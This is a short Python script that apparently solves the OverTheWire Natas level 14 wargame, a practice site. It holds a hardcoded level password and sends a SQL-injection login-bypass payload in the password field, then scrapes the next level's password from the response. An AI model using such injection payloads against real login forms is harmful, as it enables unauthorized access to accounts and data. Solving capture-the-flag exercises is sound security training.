#!/usr/local/bin/python3
import requests
import re

username = "natas14"
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/?debug' % username


data = {"username": "natas14", "password": '"or "1" ="1'}

response = requests.post(url, auth=(username, password), data=data)
content = response.text

# print(content)

print(re.findall('The password for natas15 is (.*)<br', content)[0])
